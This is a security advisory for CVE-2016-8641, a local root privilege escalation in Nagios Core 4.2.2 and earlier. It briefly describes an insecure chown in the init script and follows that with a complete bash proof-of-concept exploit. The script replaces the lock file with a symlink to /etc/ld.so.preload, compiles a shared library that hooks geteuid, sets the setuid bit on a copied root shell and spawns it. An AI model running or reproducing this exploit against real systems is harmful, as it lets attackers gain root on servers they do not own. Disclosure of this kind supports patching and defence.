Affected Product:    Nagios 4
Vulnerability Type:   root privilege escalation
Fixed in Version: N/A
Vendor Website:      	https://www.nagios.com/
Software Link: : 	https://sourceforge.net/projects/nagios/files/latest/download?source=directory-featured
Affected Version: 4.2.2 and prior
Tested on: Ubuntu
Remote Exploitable:  No
Reported to vendor:  8 november 2016
Disclosed to public: 
Release mode:        Responsible Disclosure
CVE-2016-8641 Nagios 4.2.2 - root privilege escalation
Credits:   Vincent Malguy


Description (from wikipedia) :
Nagios /ˈnɑːɡiːoʊs/, now known as Nagios Core, is a free and open source computer-software application that monitors systems, networks and infrastructure. Nagios offers monitoring and alerting services for servers, switches, applications and services. It alerts users when things go wrong and alerts them a second time when the problem has been resolved.

********************* CVE-2016-8641 Nagios 4.2.2 - root privilege escalation  *********************
Using official installation instruction  at https://assets.nagios.com/downloads/nagioscore/docs/nagioscore/4/en/quickstart-ubuntu.html,
nagios' user is create with a shell :

Create a new nagios user account and give it a password.
/usr/sbin/useradd -m -s /bin/bash nagios

leading to a  entry in /etc/passwd like this "nagios:x:1001:1001::/home/nagios:/bin/bash"

This means that if someone has access to the nagios account, he can access any files own by nagios.

The Nagios startup script, run by root, is insecurely giving owner of file to nagios use :
(/etc/init.d/nagios: line 190)
touch $NagiosRunFile
chown $NagiosUser:$NagiosGroup $NagiosRunFile $NagiosVarDir/nagios.log $NagiosRetentionFile

If Nagios user symlink $NagiosRunFile to a file that he has no access to, at startup or reboot   of the nagios daemon, the init script with give him ownership of the linked file.


Exploit :
#!/bin/bash -p
#



TARGETSERVICE="Nagios"
LOWUSER="nagios"
TARGETPATH="/usr/local/nagios/var/nagios.lock"

BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/rootbackdoor"
PRIVESCLIB="/tmp/privesclib.so"
PRIVESCSRC="/tmp/privesclib.c"
SUIDBIN="/usr/bin/sudo"

function cleanexit {
# Cleanup
echo -e "\n[+] Cleaning up..."
rm -f $PRIVESCSRC
rm -f $PRIVESCLIB
rm -f $TARGETPATH
touch $TARGETPATH
if [ -f /etc/ld.so.preload ]; then
echo -n > /etc/ld.so.preload
fi
echo -e "\n[+] Job done. Exiting with code $1 \n"
exit $1
}

function ctrl_c() {
        echo -e "\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation."
cleanexit 0
}

#intro
echo -e "\033[94m \nNagios - Root Privilege Escalation PoC Exploit \nNagios-chowned.sh (ver. 1.0)\n\nCVE-2016-XXXX \n"
echo -e "Discovered by: Vincent Malguy\n Original exploit code borrow from Dawid Golunski http://legalhackers.com (Thanks!)\033[0m"


# Priv check

echo -e "\n[+] Starting the exploit as \n\033[94m`id`\033[0m"
id | grep -q ${LOWUSER}
if [ $? -ne 0 ]; then
echo -e "\n[!] You need to execute the exploit as ${LOWUSER} user! Exiting.\n"
exit 3
fi


echo -e "\n[+] Target ${LOWUSER} file set to $TARGETPATH "

# [ Active exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
       #include <sys/types.h>
       #include <sys/stat.h>
       #include <fcntl.h>

uid_t geteuid(void) {
static uid_t  (*old_geteuid)();
old_geteuid = dlsym(RTLD_NEXT, "geteuid");
if ( old_geteuid() == 0 ) {
chown("$BACKDOORPATH", 0, 0);
chmod("$BACKDOORPATH", 04777);
//unlink("/etc/ld.so.preload");
}
return old_geteuid();
}
_solibeof_
/bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"
if [ $? -ne 0 ]; then
echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
cleanexit 2;
fi


# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
exit 2
fi

# Symlink the log file to /etc
rm -f $TARGETPATH && ln -s /etc/ld.so.preload $TARGETPATH
if [ $? -ne 0 ]; then
echo -e "\n[!] Couldn't remove the $TARGETPATH file or create a symlink."
cleanexit 3
fi
echo -e "\n[+] Symlink created at: \n`ls -l $TARGETPATH`"

# Kill target service if possible
#echo -ne "\n[+] Killing ${TARGETSERVICE}...\n"
#killall ${TARGETSERVICE}



# Wait for target service startup to re-create target file
echo -ne "\n[+] Waiting for ${TARGETSERVICE} startup to re-create the ${TARGETPATH}...\n"

while :; do
# if target file can be recreated by target process (like logs files), we need to keep remove and link it
rm -f $TARGETPATH && ln -s /etc/ld.so.preload $TARGETPATH
sleep 0.1
if [ -f /etc/ld.so.preload ]; then
echo $PRIVESCLIB > /etc/ld.so.preload
rm -f $TARGETPATH
break;
fi
done

# /etc/ld.so.preload dir should be owned by our low priv controled  user at this point
# Inject the privesc.so shared library to escalate privileges
echo $PRIVESCLIB > /etc/ld.so.preload
echo -e "\n[+] ${TARGETSERVICE} restarted. The /etc/ld.so.preload file got created with ${LOWUSER} privileges: \n`ls -l /etc/ld.so.preload`"
echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"
chmod 755 /etc/ld.so.preload

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"
sudo 2>/dev/null >/dev/null


# Check for the rootshell
ls -l $BACKDOORPATH
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then
echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
echo -e "\n\033[94mGot root! The ${TARGETSERVICE} server has been ch-OWNED !\033[0m"
else
echo -e "\n[!] Failed to get root"
cleanexit 2
fi


# Execute the rootshell
echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
$BACKDOORPATH -p

# Job done.
cleanexit 0
